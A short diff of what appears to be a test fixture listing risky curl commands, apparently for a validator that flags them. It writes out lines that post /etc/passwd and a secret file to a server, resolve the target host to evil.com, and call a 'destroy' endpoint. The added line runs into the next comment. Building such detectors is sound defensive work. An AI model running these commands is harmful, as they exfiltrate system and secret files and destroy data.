@@ -206,7 +206,7 @@ curl -s --resolve studio.taufinity.io:443:evil.com:443 "https://studio.taufinity
 # curl with @file data reference (exfiltration)
 curl -s -X POST "https://studio.taufinity.io/api/data" -d @/etc/passwd
 # curl with --data-binary @file
-# Destructive path keyword
+curl -s -X POST "https://studio.taufinity.io/api/data" --data-binary @/tmp/secret.txt# Destructive path keyword
 curl -s -X POST "https://studio.taufinity.io/api/sites/2/destroy"
 # curl with no URL (bare curl)
 curl -s -H "Authorization: Bearer token"
